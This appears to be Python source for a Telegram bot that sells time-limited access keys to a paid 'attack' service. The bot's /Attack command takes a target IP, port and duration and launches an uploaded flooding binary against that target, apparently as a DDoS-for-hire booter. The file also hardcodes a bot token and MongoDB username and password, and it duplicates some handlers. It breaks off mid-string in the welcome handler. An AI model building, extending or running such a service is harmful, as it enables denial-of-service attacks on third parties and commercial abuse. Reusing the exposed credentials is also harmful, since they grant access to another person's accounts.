import time
import logging
import json
from threading import Thread
import telebot
import asyncio
import random
import string
from datetime import datetime, timedelta
from telebot.apihelper import ApiTelegramException
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from typing import Dict, List, Optional
import sys
import os
import base64
from pymongo import MongoClient
from telegram import Message

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

KEY_PRICES = {
    'hour': 10,   # 1 hour: ₹10
    '1day': 60,  # 1 day: ₹120
    '2day': 185,  # 2 days: ₹185
    '3day': 250,  # 3 days: ₹250
    '4day': 310,  # 4 days: ₹310
    '5day': 375,  # 5 days: ₹375
    '6day': 410,  # 6 days: ₹410
    '7day': 450   # 7 days: ₹450
}

ADMIN_IDS = [1949883614]
BOT_TOKEN = "7482254378:AAEKx2Wi3EKJoSXa_N9H2TUgDmeQwbF_0EA"
MONGO_URI = "mongodb+srv://SmokieTravis:SmokieOfficial@cluster0.0ea19.mongodb.net/Travis?retryWrites=true&w=majority&appName=Cluster0"
# MongoDB Client
mongo_client = MongoClient(MONGO_URI)
db = mongo_client['Travis']  # Database name
thread_count = 100
users_collection = db['users']
keys_collection = db['keys']
admin_collection = db['admins']
binary_state_collection = db['binary_state']
BINARY_UPLOAD_DIR = BASE_DIR

def load_admin_data():
    """Load admin data from MongoDB"""
    try:
        # Check if admin document exists, if not create default
        admin_data = admin_collection.find_one({'type': 'admin_data'})
        
        if not admin_data:
            default_admins = {str(admin_id): {'balance': float('inf')} for admin_id in ADMIN_IDS}
            admin_data = {
                'type': 'admin_data',
                'admins': default_admins
            }
            admin_collection.insert_one(admin_data)
        
        return admin_data
    except Exception as e:
        logger.error(f"Error loading admin data: {e}")
        return {'admins': {str(admin_id): {'balance': float('inf')} for admin_id in ADMIN_IDS}}
    
def update_admin_balance(admin_id: str, amount: float) -> bool:
    """
    Update admin's balance after key generation
    Returns True if successful, False if insufficient balance
    """
    try:
        # Fetch admin data
        admin_data = admin_collection.find_one({'type': 'admin_data'})
        
        # Super admins have infinite balance
        if int(admin_id) in ADMIN_IDS:
            return True
            
        if str(admin_id) not in admin_data['admins']:
            return False
            
        current_balance = admin_data['admins'][str(admin_id)]['balance']
        
        if current_balance < amount:
            return False
            
        # Update balance in MongoDB
        admin_collection.update_one(
            {'type': 'admin_data'},
            {'$set': {f'admins.{str(admin_id)}.balance': current_balance - amount}}
        )
        
        return True
        
    except Exception as e:
        logging.error(f"Error updating admin balance: {e}")
        return False
    
def save_admin_data(data):
    """Save admin data to MongoDB"""
    try:
        # Replace the entire admin data document
        admin_collection.replace_one({'type': 'admin_data'}, data, upsert=True)
        return True
    except Exception as e:
        logger.error(f"Error saving admin data: {e}")
        return False
    
def is_super_admin(user_id):
    """Check if user is a super admin"""
    return user_id in ADMIN_IDS

def get_admin_balance(user_id):
    """Get admin's balance from MongoDB"""
    admin_data = load_admin_data()
    return admin_data['admins'].get(str(user_id), {}).get('balance', 0)

def calculate_key_price(amount: int, time_unit: str) -> float:
    """Calculate the price for a key based on duration"""
    base_price = KEY_PRICES.get(time_unit.lower().rstrip('s'), 0)
    return base_price * amount

def load_binary_state():
    """Load binary state from MongoDB"""
    try:
        # Try to find the binary state
        state_doc = binary_state_collection.find_one({'type': 'binary_state'})
        
        if state_doc:
            return state_doc.get('binary', 'Smokie')
        
        # If no state exists, create a default one
        binary_state_collection.insert_one({
            'type': 'binary_state',
            'binary': 'Smokie',
            'last_updated': datetime.now().isoformat()
        })
        
        return 'Smokie'
    except Exception:
        return 'Smokie'


def save_binary_state(binary):
    """Save binary state to MongoDB"""
    try:
        # Update or insert the binary state
        binary_state_collection.replace_one(
            {'type': 'binary_state'},
            {
                'type': 'binary_state',
                'binary': binary,
                'last_updated': datetime.now().isoformat()
            },
            upsert=True
        )
        return True
    except Exception:
        return False

def clear_binary_state():
    """Clear existing binary state in MongoDB"""
    try:
        binary_state_collection.delete_many({'type': 'binary_state'})
    except Exception:
        pass

Hmm_Smokie = "QFNtb2tpZU9mZmljaWFs"
Hmm_Smokiee = "QEhtbV9TbW9raWU="

def _d(s):
    return base64.b64decode(s).decode()

bot = telebot.TeleBot(BOT_TOKEN)

# Initialize other required variables
redeemed_keys = set()
loop = None

# File paths
# File paths with absolute directory
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USERS_FILE = os.path.join(BASE_DIR, 'users.txt')
KEYS_FILE = os.path.join(BASE_DIR, 'key.txt')


keys = {}

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

def ensure_file_exists(filepath):
    """Ensure the file exists and create if it doesn't"""
    if not os.path.exists(filepath):
        with open(filepath, 'w') as f:
            if filepath.endswith('.txt'):
                f.write('[]')  # Initialize with empty array for users.txt
            else:
                f.write('{}')  # Initialize with empty object for other files

def load_users():
    """Load users from MongoDB"""
    try:
        # Convert MongoDB cursor to list of users
        users = list(users_collection.find({}, {'_id': 0}))
        
        # Filter out expired users
        current_time = datetime.now()
        active_users = [
            user for user in users 
            if datetime.fromisoformat(user['valid_until']) > current_time
        ]
        
        return active_users
    except Exception as e:
        logging.error(f"Error loading users: {e}")
        return []

def save_users(users):
    """Save users to MongoDB"""
    try:
        # Clear existing users and insert new ones
        users_collection.delete_many({})
        if users:
            users_collection.insert_many(users)
        return True
    except Exception as e:
        logging.error(f"Error saving users: {e}")
        return False

    
def get_username_from_id(user_id):
    users = load_users()
    for user in users:
        if user['user_id'] == user_id:
            return user.get('username', 'N/A')
    return "N/A"

def is_admin(user_id):
    """Check if user is either a super admin or regular admin"""
    admin_data = load_admin_data()
    return str(user_id) in admin_data['admins'] or user_id in ADMIN_IDS

def load_keys():
    """Load keys from MongoDB"""
    try:
        # Retrieve keys from MongoDB and convert to timedelta
        keys_data = list(keys_collection.find({}, {'_id': 0}))
        keys = {}
        
        for key_entry in keys_data:
            for key, duration_str in key_entry.items():
                if key != '_id':
                    days, seconds = map(float, duration_str.split(','))
                    keys[key] = timedelta(days=days, seconds=seconds)
        
        return keys
    except Exception as e:
        logging.error(f"Error loading keys: {e}")
        return {}

def save_keys(keys):
    """Save keys to MongoDB"""
    try:
        # Clear existing keys and insert new ones
        keys_collection.delete_many({})
        
        # Convert keys to storable format
        keys_to_save = []
        for key, duration in keys.items():
            keys_to_save.append({
                key: f"{duration.days},{duration.seconds}"
            })
        
        if keys_to_save:
            keys_collection.insert_many(keys_to_save)
        
        return True
    except Exception as e:
        logging.error(f"Error saving keys: {e}")
        return False
    
def check_user_expiry():
    """Periodically check and remove expired users"""
    while True:
        try:
            users = load_users()
            current_time = datetime.now()
            
            # Filter out expired users
            active_users = [
                user for user in users 
                if datetime.fromisoformat(user['valid_until']) > current_time
            ]
            
            # Only save if there are changes
            if len(active_users) != len(users):
                save_users(active_users)
                
        except Exception as e:
            logging.error(f"Error in check_user_expiry: {e}")
        
        time.sleep(300)  # Check every 5 minutes

def generate_key(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

@bot.message_handler(commands=['setSmokie'])
def set_Smokie(message):
    global selected_binary
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to change binary settings.*", parse_mode='Markdown')
        return
    
    try:
        # Check if Smokie binary exists in main directory
        binary_path = os.path.join(BASE_DIR, "Smokie")
        if not os.path.exists(binary_path):
            bot.send_message(chat_id, "*Smokie binary not found in directory. Please upload the binary first.*", parse_mode='Markdown')
            return

        # Clear old state first
        clear_binary_state()
        
        # Set and save new state
        selected_binary = "Smokie"
        if save_binary_state(selected_binary):
            bot.send_message(chat_id, "*Binary successfully set to Smokie.*", parse_mode='Markdown')
            logging.info(f"Admin {user_id} changed binary to Smokie")
        else:
            bot.send_message(chat_id, "*Binary set to Smokie but there was an error saving the state.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in set_Smokie: {e}")
        bot.send_message(chat_id, "*Error occurred while changing binary settings.*", parse_mode='Markdown')

@bot.message_handler(commands=['setSmokie1'])
def set_Smokie1(message):
    global selected_binary
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to change binary settings.*", parse_mode='Markdown')
        return
    
    try:
        # Check if Smokie1 binary exists in upload directory
        binary_path = os.path.join(BASE_DIR, "Smokie1")
        if not os.path.exists(binary_path):
            bot.send_message(chat_id, "*Smokie1 binary not found in upload directory. Please upload the binary first.*", parse_mode='Markdown')
            return

        # Clear old state first
        clear_binary_state()
        
        # Set and save new state
        selected_binary = "Smokie1"
        if save_binary_state(selected_binary):
            bot.send_message(chat_id, "*Binary successfully set to Smokie1.*", parse_mode='Markdown')
            logging.info(f"Admin {user_id} changed binary to Smokie1")
        else:
            bot.send_message(chat_id, "*Binary set to Smokie1 but there was an error saving the state.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in set_Smokie1: {e}")
        bot.send_message(chat_id, "*Error occurred while changing binary settings.*", parse_mode='Markdown')

@bot.message_handler(commands=['checkbinary'])
def check_binary(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to check binary settings.*", parse_mode='Markdown')
        return
    
    try:
        # Load binary state from MongoDB
        state_doc = binary_state_collection.find_one({'type': 'binary_state'})
        
        if state_doc:
            current_state = state_doc.get('binary', 'Not Set')
            last_updated = datetime.fromisoformat(state_doc.get('last_updated', datetime.now().isoformat())).strftime("%Y-%m-%d %H:%M:%S")
        else:
            current_state = "Not Set"
            last_updated = "Unknown"
        
        # Check if the set binary actually exists
        binary_path = os.path.join(BASE_DIR, current_state)
        binary_exists = os.path.exists(binary_path)
        
        # Prepare status message
        status_message = (
            f"*Current Binary Status:*\n"
            f"Active Binary: {current_state.upper()}\n"
            f"Last Updated: {last_updated}\n"
            f"Binary Exists: {'Yes' if binary_exists else 'No'}\n"
        )
        
        # Get list of binary files
        binary_files = [f for f in os.listdir(BASE_DIR) if os.path.isfile(os.path.join(BASE_DIR, f)) and f in ['Smokie', 'Smokie1']]
        
        # Add information about binary files
        if not binary_files:
            status_message += "*No Binaries in Directory*"
        else:
            status_message += "*Binaries in Directory:*\n" + "\n".join(f"- {binary}" for binary in binary_files)
        
        bot.send_message(chat_id, status_message, parse_mode='Markdown')
    
    except Exception as e:
        logging.error(f"Unexpected error in check_binary: {e}")
        bot.send_message(chat_id, "*Critical error occurred while checking binary status.*", parse_mode='Markdown')

@bot.message_handler(commands=['thread'])
def set_thread_count(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Only super admins can change thread settings
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to change thread settings.*", parse_mode='Markdown')
        return

    if selected_binary == "Smokie":
        bot.send_message(chat_id, "*Please specify the thread count.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_thread_command)
    else:
        bot.send_message(chat_id, "*Thread setting is only available for Smokie binary. Currently using Smokie1.*", parse_mode='Markdown')

def process_thread_command(message):
    global thread_count
    chat_id = message.chat.id

    try:
        new_thread_count = int(message.text)
        
        if new_thread_count <= 0:
            bot.send_message(chat_id, "*Thread count must be a positive number.*", parse_mode='Markdown')
            return

        thread_count = new_thread_count
        bot.send_message(chat_id, f"*Thread count set to {thread_count} for Smokie.*", parse_mode='Markdown')

    except ValueError:
        bot.send_message(chat_id, "*Invalid thread count. Please enter a valid number.*", parse_mode='Markdown')

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
    global selected_binary, thread_count
    
    try:
        # Construct full path to binary
        binary_path = os.path.join(BINARY_UPLOAD_DIR, selected_binary)
        
        # Check if binary exists
        if not os.path.exists(binary_path):
            bot.send_message(chat_id, f"*Binary {selected_binary} not found. Please upload it first.*", parse_mode='Markdown')
            return

        # Construct command based on selected binary
        if selected_binary == "Smokie":
            command = f"{binary_path} {target_ip} {target_port} {duration} {thread_count}"
        else:  # Smokie1
            command = f"{binary_path} {target_ip} {target_port} {duration}"

        # Send initial attack message
        attack_message = bot.send_message(
            chat_id, 
            f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗜𝗻𝗶𝘁𝗶𝗮𝘁𝗲𝗱!\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} seconds"
        )

        # Create and run process without output
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL
        )

        # Countdown update
        for remaining_time in range(duration, 0, -1):
            await asyncio.sleep(1)
            # Edit the message to show the remaining time
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=attack_message.message_id,
                text=f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗜𝗻 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀...\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗧𝗶𝗺𝗲: {remaining_time} seconds"
            )

        # Wait for process to complete
        await process.wait()

        # Send completion message
        if selected_binary == "Smokie":
            bot.send_message(chat_id, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀\nUsing: Smokie\nThreads: Nhi Bataunga")
        else:
            bot.send_message(chat_id, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀\nUsing: Smokie1")

    except Exception as e:
        bot.send_message(chat_id, "Failed to execute the attack. Please try again later.")
        logging.error(f"Error in run_attack_command_on_codespace: {e}")

@bot.message_handler(commands=['genkey'])
def genkey_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to generate keys.\nContact Owner: @Hmm_Smokie*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) != 3:
        bot.send_message(chat_id, (
            "*Usage: /genkey <amount> <unit>*\n\n"
            "Available units and prices:\n"
            "- hour/hours (10₹ per hour)\n"
            "- day/days (80₹ per day)\n"
            "- week/weeks (500₹ per week)"
        ), parse_mode='Markdown')
        return
    
    try:
        amount = int(cmd_parts[1])
        time_unit = cmd_parts[2].lower()
        
        # Normalize time unit
        base_unit = time_unit.rstrip('s')  # Remove trailing 's' if present
        if base_unit == 'week':
            duration = timedelta(weeks=amount)
            price_unit = 'week'
        elif base_unit == 'day':
            duration = timedelta(days=amount)
            price_unit = 'day'
        elif base_unit == 'hour':
            duration = timedelta(hours=amount)
            price_unit = 'hour'
        else:
            bot.send_message(chat_id, "*Invalid time unit. Use 'hours', 'days', or 'weeks'.*", parse_mode='Markdown')
            return
        
        # Calculate price
        price = calculate_key_price(amount, price_unit)
        
        # Check and update balance
        if not update_admin_balance(str(user_id), price):
            current_balance = get_admin_balance(user_id)
            bot.send_message(chat_id, 
                f"*Insufficient balance!*\n\n"
                f"Required: {price}₹\n"
                f"Your balance: {current_balance}₹", 
                parse_mode='Markdown')
            return
        
        # Generate and save key
        global keys
        keys = load_keys()
        key = generate_key()
        keys[key] = duration
        save_keys(keys)
        
        # Send success message
        new_balance = get_admin_balance(user_id)
        success_msg = (
            f"*Key generated successfully!*\n\n"
            f"Key: `{key}`\n"
            f"Duration: {amount} {time_unit}\n"
            f"Price: {price}₹\n"
            f"Remaining balance: {new_balance}₹\n\n"
            f"Copy this key and use:\n/redeem {key}"
        )
        
        bot.send_message(chat_id, success_msg, parse_mode='Markdown')
        
        # Log the transaction
        logging.info(f"Admin {user_id} generated key worth {price}₹ for {amount} {time_unit}")
    
    except ValueError:
        bot.send_message(chat_id, "*Invalid amount. Please enter a number.*", parse_mode='Markdown')
        return
    except Exception as e:
        logging.error(f"Error in genkey_command: {e}")
        bot.send_message(chat_id, "*An error occurred while generating the key.*", parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if len(cmd_parts) != 2:
        bot.send_message(chat_id, "*Usage: /redeem <key>*", parse_mode='Markdown')
        return

    key = cmd_parts[1]
    
    # Load the current keys
    global keys
    keys = load_keys()
    
    # Check if the key is valid and not already redeemed
    if key in keys and key not in redeemed_keys:
        duration = keys[key]  # This is already a timedelta
        expiration_time = datetime.now() + duration

        users = load_users()
        # Save the user info to users.txt
        found_user = next((user for user in users if user['user_id'] == user_id), None)
        if not found_user:
            new_user = {
                'user_id': user_id,
                'username': f"@{message.from_user.username}" if message.from_user.username else "Unknown",
                'valid_until': expiration_time.isoformat().replace('T', ' '),
                'current_date': datetime.now().isoformat().replace('T', ' '),
                'plan': 'Plan Premium'
            }
            users.append(new_user)
        else:
            found_user['valid_until'] = expiration_time.isoformat().replace('T', ' ')
            found_user['current_date'] = datetime.now().isoformat().replace('T', ' ')

        # Mark the key as redeemed
        redeemed_keys.add(key)
        # Remove the used key from the keys file
        del keys[key]
        save_keys(keys)
        save_users(users)

        bot.send_message(chat_id, "*Key redeemed successfully!*", parse_mode='Markdown')
    else:
        if key in redeemed_keys:
            bot.send_message(chat_id, "*This key has already been redeemed!*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*Invalid key!*", parse_mode='Markdown')

@bot.message_handler(commands=['remove'])
def remove_user_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to remove users.\nContact Owner:- @Hmm_Smokie*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) != 2:
        bot.send_message(chat_id, "*Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(cmd_parts[1])
    users = load_users()
    users = [user for user in users if user['user_id'] != target_user_id]
    save_users(users)

    bot.send_message(chat_id, f"User {target_user_id} has been removed.")

@bot.message_handler(commands=['users'])
def list_users_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Only super admins can see all users
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to view all users.*", parse_mode='Markdown')
        return

    users = load_users()
    valid_users = [user for user in users if datetime.now() < datetime.fromisoformat(user['valid_until'])]

    if valid_users:
        user_list = "\n".join(f"ID: {user['user_id']}, Username: {user.get('username', 'N/A')}" for user in valid_users)
        bot.send_message(chat_id, f"Registered users:\n{user_list}")
    else:
        bot.send_message(chat_id, "No users have valid keys.")

@bot.message_handler(commands=['addadmin'])
def add_admin_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Only super admins can add new admins
    if not is_super_admin(user_id):
        bot.reply_to(message, "*You are not authorized to add admins.*", parse_mode='Markdown')
        return

    try:
        # Parse command arguments
        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, "*Usage: /addadmin <user_id> <balance>*", parse_mode='Markdown')
            return

        new_admin_id = args[1]
        try:
            balance = float(args[2])
            if balance < 0:
                bot.reply_to(message, "*Balance must be a positive number.*", parse_mode='Markdown')
                return
        except ValueError:
            bot.reply_to(message, "*Balance must be a valid number.*", parse_mode='Markdown')
            return

        # Load current admin data
        admin_data = load_admin_data()

        # Add new admin with balance
        admin_data['admins'][new_admin_id] = {
            'balance': balance,
            'added_by': user_id,
            'added_date': datetime.now().isoformat()
        }

        # Save updated admin data
        if save_admin_data(admin_data):
            bot.reply_to(message, f"*Successfully added admin:*\nID: `{new_admin_id}`\nBalance: `{balance}`", parse_mode='Markdown')
            
            # Try to notify the new admin
            try:
                bot.send_message(
                    int(new_admin_id),
                    "*🎉 Congratulations! You have been promoted to admin!*\n"
                    f"Your starting balance is: `{balance}`\n\n"
                    "You now have access to admin commands:\n"
                    "/genkey - Generate new key\n"
                    "/remove - Remove user\n"
                    "/balance - Check your balance",
                    parse_mode='Markdown'
                )
            except:
                logger.warning(f"Could not send notification to new admin {new_admin_id}")
        else:
            bot.reply_to(message, "*Failed to add admin. Please try again.*", parse_mode='Markdown')

    except Exception as e:
        logger.error(f"Error in add_admin_command: {e}")
        bot.reply_to(message, "*An error occurred while adding admin.*", parse_mode='Markdown')

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.reply_to(message, "*This command is only available for admins.*", parse_mode='Markdown')
        return

    balance = get_admin_balance(user_id)
    if is_super_admin(user_id):
        bot.reply_to(message, "*You are a super admin with unlimited balance.*", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"*Your current balance: {balance}*", parse_mode='Markdown')

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # If user is admin, allow attack without key check
    if is_admin(user_id):
        try:
            bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
            bot.register_next_step_handler(message, process_attack_command, chat_id)
            return
        except Exception as e:
            logging.error(f"Error in attack command: {e}")
            return

    # For regular users, check if they have a valid key
    users = load_users()
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if not found_user:
        bot.send_message(chat_id, "*You are not registered. Please redeem a key.\nContact For New Key:- @Hmm_Smokie*", parse_mode='Markdown')
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message, chat_id):
    try:
        args = message.text.split()
        
        if len(args) != 3:
            bot.send_message(chat_id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
            return
        
        target_ip = args[0]
        
        try:
            target_port = int(args[1])
        except ValueError:
            bot.send_message(chat_id, "*Port must be a valid number.*", parse_mode='Markdown')
            return
        
        try:
            duration = int(args[2])
        except ValueError:
            bot.send_message(chat_id, "*Duration must be a valid number.*", parse_mode='Markdown')
            return

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        # Create a new event loop for this thread if necessary
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

        # Run the attack command
        loop.run_until_complete(run_attack_command_on_codespace(target_ip, target_port, duration, chat_id))
        
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(chat_id, "*An error occurred while processing your command.*", parse_mode='Markdown')

@bot.message_handler(commands=['uploadbinary'])
def upload_binary_command(message):
    """
    Command to initiate binary upload process
    Only super admins can upload binaries
    """
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Check if user is a super admin
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to upload binaries.*", parse_mode='Markdown')
        return

    # Prepare user for binary upload
    bot.send_message(chat_id, "*Please upload the binary file. Supported binaries: Smokie, Smokie1*", parse_mode='Markdown')
    
    # Register next step handler to process the file
    bot.register_next_step_handler(message, process_binary_upload)


def process_binary_upload(message: Message):
    """
    Process the uploaded binary file
    """
    chat_id = message.chat.id
    user_id = message.from_user.id

    # No need to ensure directory, we'll use BASE_DIR

    # Check if message contains a document
    if not message.document:
        bot.send_message(chat_id, "*No file uploaded. Please send a binary file.*", parse_mode='Markdown')
        return

    try:
        # Download the file
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        # Suggested filename based on user's request
        suggested_filename = message.document.file_name
        
        # Full path for saving the binary in BASE_DIR
        binary_path = os.path.join(BASE_DIR, suggested_filename)

        # Save the file
        with open(binary_path, 'wb') as new_file:
            new_file.write(downloaded_file)

        # Make the file executable
        os.chmod(binary_path, 0o755)

        # Check if the file is either Smokie or Smokie1
        if suggested_filename not in ['Smokie', 'Smokie1']:
            os.remove(binary_path)
            bot.send_message(chat_id, "*Invalid binary name. Only 'Smokie' and 'Smokie1' are allowed.*", parse_mode='Markdown')
            return

        # Log the upload
        logging.info(f"Binary uploaded by admin {user_id}: {suggested_filename}")
        
        # Confirmation message
        bot.send_message(chat_id, f"*Binary '{suggested_filename}' uploaded successfully!*", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error uploading binary: {e}")
        bot.send_message(chat_id, "*Failed to upload binary. Please try again.*", parse_mode='Markdown')

@bot.message_handler(commands=['listbinaries'])
def list_binaries(message):
    """
    List available binaries
    Only super admins can list binaries
    """
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Check if user is a super admin
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to list binaries.*", parse_mode='Markdown')
        return

    try:
        # Get list of binary files in BASE_DIR
        binary_files = [f for f in os.listdir(BASE_DIR) if os.path.isfile(os.path.join(BASE_DIR, f)) and f in ['Smokie', 'Smokie1']]
        
        if not binary_files:
            bot.send_message(chat_id, "*No binaries uploaded yet.*", parse_mode='Markdown')
            return

        # Prepare binary list message
        binary_list = "*Uploaded Binaries:*\n"
        binary_list += "\n".join([f"- {binary}" for binary in binary_files])
        
        bot.send_message(chat_id, binary_list, parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error listing binaries: {e}")
        bot.send_message(chat_id, "*Failed to list binaries.*", parse_mode='Markdown')

@bot.message_handler(commands=['owner'])
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By @Hmm_Smokie"  
    bot.send_message(message.chat.id, owner_message)

@bot.message_handler(commands=['addadmin'])
def add_admin_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Only super admins can add new admins
    if not is_super_admin(user_id):
        bot.reply_to(message, "*You are not authorized to add admins.*", parse_mode='Markdown')
        return

    try:
        # Parse command arguments
        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, "*Usage: /addadmin <user_id> <balance>*", parse_mode='Markdown')
            return

        new_admin_id = args[1]
        try:
            balance = float(args[2])
            if balance < 0:
                bot.reply_to(message, "*Balance must be a positive number.*", parse_mode='Markdown')
                return
        except ValueError:
            bot.reply_to(message, "*Balance must be a valid number.*", parse_mode='Markdown')
            return

        # Load current admin data
        admin_data = load_admin_data()

        # Add new admin with balance
        admin_data['admins'][new_admin_id] = {
            'balance': balance,
            'added_by': user_id,
            'added_date': datetime.now().isoformat()
        }

        # Save updated admin data
        if save_admin_data(admin_data):
            bot.reply_to(message, f"*Successfully added admin:*\nID: `{new_admin_id}`\nBalance: `{balance}`", parse_mode='Markdown')
            
            # Try to notify the new admin
            try:
                bot.send_message(
                    int(new_admin_id),
                    "*🎉 Congratulations! You have been promoted to admin!*\n"
                    f"Your starting balance is: `{balance}`\n\n"
                    "You now have access to admin commands:\n"
                    "/genkey - Generate new key\n"
                    "/remove - Remove user\n"
                    "/balance - Check your balance",
                    parse_mode='Markdown'
                )
            except:
                logger.warning(f"Could not send notification to new admin {new_admin_id}")
        else:
            bot.reply_to(message, "*Failed to add admin. Please try again.*", parse_mode='Markdown')

    except Exception as e:
        logger.error(f"Error in add_admin_command: {e}")
        bot.reply_to(message, "*An error occurred while adding admin.*", parse_mode='Markdown')

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.reply_to(message, "*This command is only available for admins.*", parse_mode='Markdown')
        return

    balance = get_admin_balance(user_id)
    if is_super_admin(user_id):
        bot.reply_to(message, "*You are a super admin with unlimited balance.*", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"*Your current balance: {balance}*", parse_mode='Markdown')

@bot.message_handler(commands=['removeadmin'])
def remove_admin_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_super_admin(user_id):
        bot.reply_to(message, "*You are not authorized to remove admins.*", parse_mode='Markdown')
        return

    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "*Usage: /removeadmin <user_id>*", parse_mode='Markdown')
            return

        admin_to_remove = args[1]
        admin_data = load_admin_data()

        if admin_to_remove in admin_data['admins']:
            del admin_data['admins'][admin_to_remove]
            if save_admin_data(admin_data):
                bot.reply_to(message, f"*Successfully removed admin {admin_to_remove}*", parse_mode='Markdown')
                
                # Try to notify the removed admin
                try:
                    bot.send_message(
                        int(admin_to_remove),
                        "*Your admin privileges have been revoked.*",
                        parse_mode='Markdown'
                    )
                except:
                    pass
            else:
                bot.reply_to(message, "*Failed to remove admin. Please try again.*", parse_mode='Markdown')
        else:
            bot.reply_to(message, "*This user is not an admin.*", parse_mode='Markdown')

    except Exception as e:
        logger.error(f"Error in remove_admin_command: {e}")
        bot.reply_to(message, "*An error occurred while removing admin.*", parse_mode='Markdown')


@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username or "N/A"

    # Create keyboard markup
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    my_account_button = KeyboardButton("🔑 ᴍʏ ᴀᴄᴄᴏᴜɴᴛ")
    attack_button = KeyboardButton("🚀 ᴀᴛᴛᴀᴄᴋ")
    markup.add(my_account_button, attack_button)

    if is_super_admin(user_id):
        welcome_message = (
            f"Welcome, Super Admin! To {_d(Hmm_Smokie)}\n\n"
            f"Admin Commands:\n"
            f"/addadmin - Add new admin\n"
            f"/removeadmin - Remove admin\n"
            f"/genkey - Generate new key\n"
            f"/remove - Remove user\n"
            f"/users - List all users\n"
